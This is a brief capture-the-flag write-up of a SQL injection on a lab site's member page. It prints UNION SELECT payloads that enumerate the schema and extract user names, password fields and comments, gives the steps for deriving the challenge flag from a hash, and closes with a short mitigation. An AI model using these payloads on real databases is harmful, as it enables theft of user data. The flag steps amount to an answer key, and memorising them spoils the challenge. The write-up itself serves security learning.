# SQL Injection on Member Page

We exploited a SQL injection on the member page to enumerate schema metadata.

To list column names:

`1=1 UNION SELECT NULL, column_name FROM information_schema.columns`

Then we extracted user fields:

`1=1 UNION SELECT first_name, countersign FROM users`

A useful hint was retrieved with:

```sql
1=1 UNION SELECT commentaire, last_name FROM users
```

The challenge provided the hash `5ff9d0165b4f92b14994e5c685cdce28`.

Steps to derive the flag:

1. MD5-decrypt hash -> `FortyTwo`
2. Convert to lowercase -> `fortytwo`
3. SHA-256 hash the result -> flag

## Vulnerability
User input was added directly to SQL queries.

## Mitigation
Use prepared statements and basic input checks.
